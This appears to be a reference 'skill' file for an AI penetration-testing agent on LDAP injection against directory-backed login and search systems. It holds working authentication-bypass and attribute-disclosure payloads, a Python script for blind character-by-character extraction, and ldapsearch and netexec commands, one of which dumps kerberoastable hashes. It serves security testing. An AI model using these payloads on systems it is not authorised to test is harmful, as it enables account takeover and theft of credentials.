---
name: LDAP Injection
description: Reference for LDAP injection covering filter syntax abuse, blind boolean / time-based probes, authentication bypass, and DN/attribute-injection patterns against directory-backed identity systems.
---

# LDAP Injection

Reference for testing LDAP injection in identity systems (login forms, search panels, account-lookup APIs). Pull this in when the target authenticates against AD / OpenLDAP / 389-DS / FreeIPA and you find inputs that flow into a filter or a DN.

> Black-box scope: probes drive HTTP forms / API parameters and observe response-body / error / timing differentials. Distinct from SQLi (RFC 4515 syntax, not SQL).

## Tool wiring

| Action | Tool | Notes |
|---|---|---|
| HTTP probes against the front-end | `execute_curl` | Always capture status, body length, and error text. |
| Direct LDAP queries to a reachable server | `kali_shell ldapsearch` | `ldapsearch -x -H ldap://target.tld -b "<base_dn>" "<filter>"`. |
| LDAP bind / authenticated dumps | `kali_shell netexec` | `nxc ldap target.tld -u user -p pass --users --groups`. |
| Multi-step probes / programmatic | `execute_code` | `ldap3` Python lib (already useful via `requests`/`pwntools` companions). |

## RFC 4515 filter primer

```
filter      = ( filtercomp )
filtercomp  = and / or / not / item
and         = & filterlist
or          = | filterlist
not         = ! filter
item        = simple / present / substring / extensible
simple      = attr filtertype value         (filtertype: =, ~=, >=, <=)
present     = attr=*
substring   = attr=initial*any*final
```

Examples:

```
(&(uid=alice)(userPassword=secret))
(|(objectClass=person)(objectClass=user))
(&(objectClass=user)(memberOf=CN=Domain Admins,...))
```

The metacharacters are: `* ( ) \ NUL`. Any input flowing into a filter without escaping these is candidate.

## Reconnaissance

### Find injection points

| Surface | Likely flow |
|---|---|
| Login forms | `username` -> `(uid=$INPUT)` or `(&(uid=$INPUT)(userPassword=$PASS))` |
| User search (employee directory) | `q` -> `(|(cn=$INPUT*)(mail=$INPUT*))` |
| Group lookup | `group` -> `(memberOf=$INPUT)` |
| Account validation | `email` -> `(mail=$INPUT)` |
| Admin search panels | `*` wildcard returns all attributes |

### Fingerprint the directory

| Banner | Hint |
|---|---|
| `objectClass: organizationalUnit` plus `dc=`, `cn=` | Generic LDAP |
| `sAMAccountName`, `userPrincipalName`, `pwdLastSet` | Active Directory |
| `inetOrgPerson`, `pwdReset`, `pwdAccountLockedTime` | OpenLDAP |
| `ipaUserAuthType`, `ipaSshPubKey` | FreeIPA |
| `nsRoleDN`, `passwordExpirationTime` | 389-DS |

When `ldapsearch` is reachable, banner-grab via:

```
kali_shell: ldapsearch -x -H ldap://target.tld -s base -b "" "(objectClass=*)"
kali_shell: ldapsearch -x -H ldap://target.tld -b "" -s base "(objectClass=*)" namingContexts
```

Returned `namingContexts` reveal the search base DNs.

### Captured-traffic workflow (proxy_brain tools)

If HTTP Traffic Capture is enabled, source and drive this from the recorded history (proxy_brain only see traffic that crossed the capture proxy).

- `redamon.params` flags the field that flows into the filter (a `q` / `username` / `group` search param).
- For a GET search param, `redamon.fuzz id "q" ["*", "*)(uid=*", "alice)(description=A*", "alice)(description=B*"]` drives the auth-bypass and boolean-blind char-by-char set over one captured QUERY param, comparing per-payload length to find the "found / not found" oracle.
- For body-param login flows (redamon.fuzz only iterates query params), `redamon.replay id mutate:{param:{"username":"alice)(&(1=1)"}}` mutates the username body param.
- `redamon.diff id_legit id_injected` makes the boolean oracle explicit (legitimate N-result response versus an injected response of different length).

## Attack matrix

### Authentication bypass

| Payload (in `username` field) | Filter reshape | Effect |
|---|---|---|
| `*` | `(&(uid=*)(userPassword=$PASS))` | Match any user (if password also lax) |
| `*)(uid=*` | `(&(uid=*)(uid=*)(userPassword=$PASS))` | Force always-true |
| `*)(uid=*))(\|(uid=*` | `(&(uid=*)(uid=*))(\|(uid=*)(userPassword=$PASS))` | Truncate filter, ignore password |
| `admin)(&(1=1` | `(&(uid=admin)(&(1=1)(userPassword=$PASS))` | Inject AND clause |
| `admin)(|(uid=*` | `(&(uid=admin)(\|(uid=*)(userPassword=$PASS))` | OR-bypass on password |
| `*)(\|(objectClass=*` | `(&(uid=*)(\|(objectClass=*))(userPassword=$PASS))` | Catch-all class match |
| `admin\00` | `(&(uid=admin\00...)` | NUL truncation (legacy clients) |

In an AD context, also try `sAMAccountName` and `userPrincipalName` payloads:

```
admin*
*)(sAMAccountName=*
*)(\|(memberOf=CN=Domain Admins
```

### Boolean blind

When the response just changes between "found / not found" but does not echo data, build a binary search:

```
(&(uid=alice)(description=A*))     -> "found"
(&(uid=alice)(description=B*))     -> "not found"
(&(uid=alice)(description=Aa*))    -> probe character by character
```

Useful for extracting attributes the UI does not normally expose (like `userPassword`, `unicodePwd`, `nthash`).

### Time-based blind

`(objectClass=*)` enumerates the entire directory and is slow when paired with a deep search; weaponize the timing diff:

```
(&(uid=alice)(|(objectClass=*)(objectClass=*)(objectClass=*)(...)))
```

When responses with the heavy clause are slow and responses without it are fast, the attribute-existence oracle is alive.

### Attribute disclosure (search bypass)

If the front-end issues `(|(cn=$INPUT*)(mail=$INPUT*))`, the operator-controlled `*` lets us pivot to other attributes:

```
*)(objectClass=*       -> dump everything
*)(memberOf=*          -> dump group memberships
*)(userPassword=*      -> dump password attribute (only when readable; usually denied)
*)(unicodePwd=*        -> AD password hash attribute (always denied to unprivileged binds)
*)(sAMAccountName=*    -> AD usernames
```

Combine with `objectClass=user` to filter results to users only.

### DN injection

When the input is concatenated into a DN (not a filter), the metacharacters change:

```
DN: cn=$INPUT,ou=people,dc=target,dc=tld
```

Payloads:

```
admin,cn=test           -> create a sibling entry (with bind)
*,ou=admins,dc=target,dc=tld   -> search a different OU
admin\,injected         -> escaped comma vs unescaped depending on parser
```

Less common but still appears in account-creation flows.

### Extensible match (rare but powerful)

```
(uid:=alice)
(uid:dn:caseExactMatch:=alice)
```

Some libraries mishandle `:dn:` chains; payload-fuzz them when the directory advertises extensible match support (`subschema` controls).

## Probe harness

Confirmation step (response-diff):

```
execute_curl url: "https://target.tld/login" method: "POST" data: 'username=alice&password=*'
execute_curl url: "https://target.tld/login" method: "POST" data: 'username=alice%29%28%26%281%3D1%29&password=anything'
# If both succeed (or both fail with the SAME error and SAME body length), inject is live.
```

Boolean blind extraction (binary search a single character):

```
execute_code language: python
import requests, string
TARGET = "https://target.tld/api/search"
TRUE_TOKEN = "User found"
known = ""
charset = string.ascii_letters + string.digits + "-_."
while True:
    found = None
    for ch in charset:
        probe = f"alice)(description={known}{ch}*"
        r = requests.get(TARGET, params={"q": probe})
        if TRUE_TOKEN in r.text:
            found = ch
            break
    if not found: break
    known += found
    print("known:", known)
```

## Tool reference

```
kali_shell: ldapsearch -x -H ldap://target.tld -b "dc=target,dc=tld" "(uid=*)" cn mail
kali_shell: ldapsearch -x -H ldaps://target.tld:636 -b "dc=target,dc=tld" "(&(objectClass=user)(memberOf=CN=Domain Admins,CN=Users,DC=target,DC=tld))" sAMAccountName
kali_shell: ldapsearch -x -H ldap://target.tld -D "uid=alice,ou=people,dc=target,dc=tld" -w 'pass' -b "" "(objectClass=*)" supportedControl
kali_shell: nxc ldap target.tld -u alice -p pass --users
kali_shell: nxc ldap target.tld -u alice -p pass --groups
kali_shell: nxc ldap target.tld -u alice -p pass --kerberoasting /tmp/kerb.hash
```

## Validation shape

A clean LDAP-injection finding includes:

1. The exact request and parameter being injected.
2. Original filter shape (inferred from response differential or schema knowledge).
3. The injected payload and the resulting filter.
4. Side-by-side: legitimate request returning N results, injected request returning M (where M > N or M leaks attributes).
5. For auth bypass: a successful login PoC + an audit-log entry confirming the bound user.

## False positives

- Server-side parameterized binds (e.g. `ldap.bind(uid)` with proper escaping of `* ( ) \ NUL`).
- Strict allowlist on input characters (alphanumeric + `.@-_`).
- Server applies LDAP-encoded filter via library functions, not string concatenation.
- Generic 500 error returned for every malformed input regardless of payload.

## Hand-off

```
Authentication bypass             -> built-in brute_force_credential_guess (downstream)
Attribute disclosure of password   -> /skill jwt_attacks (if password is JWT-format) or report directly
DN injection on account creation   -> file as Mass Assignment + LDAP Injection
AD-specific abuse                  -> /skill ad_kill_chain (built-in AD attack chain)
```

## Pro tips

- LDAP servers often have **two** binds: anonymous (browse) and authenticated (privileged). Always test both contexts.
- AD-specific attributes (`sAMAccountName`, `userPrincipalName`, `memberOf`, `pwdLastSet`, `userAccountControl`) are richer probe targets than generic `cn`/`uid`.
- Time-based oracles work better against `(objectClass=*)` than against narrow filters; the directory has to walk every entry.
- The `subschema` `subentry` (cn=Subschema) reveals the full attribute / objectClass catalogue when readable.
- Many LDAP front-ends sanitize `*` but forget `()`; test parenthesis injection independently.
